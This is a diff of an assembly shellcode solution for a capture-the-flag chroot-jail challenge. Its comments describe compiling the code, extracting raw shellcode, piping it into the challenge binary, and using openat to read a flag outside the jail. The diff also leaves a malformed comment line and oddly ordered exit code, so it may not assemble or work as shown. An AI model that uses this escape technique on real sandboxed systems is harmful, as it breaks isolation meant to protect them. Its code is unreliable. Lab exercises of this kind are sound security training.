@@ -20,7 +20,7 @@ _start:
         mov rax, 40
         syscall
 				
-				//exit cleanly
+	/exit cleanly
 				
         syscall
         mov rax, 60
@@ -28,3 +28,11 @@ _start:
 
 path:
         .string "../flag"
+
+// compile with `gcc -nostdlib -static -o solution-elf solution.s`
+// then dump the raw shellcode `objcopy --dump-section .text=solution-raw solution-elf`
+// after that it can be redirected into the target challenge with cat
+// cat solution-raw | ./mini_jail_easy_1 /an_existing_folder
+// another folder is necessary in the directory where the challenge is located. 
+// escaping from chroot requires another directory.
+// The code will use the syscall openat to read the flag outside of the jail directory.
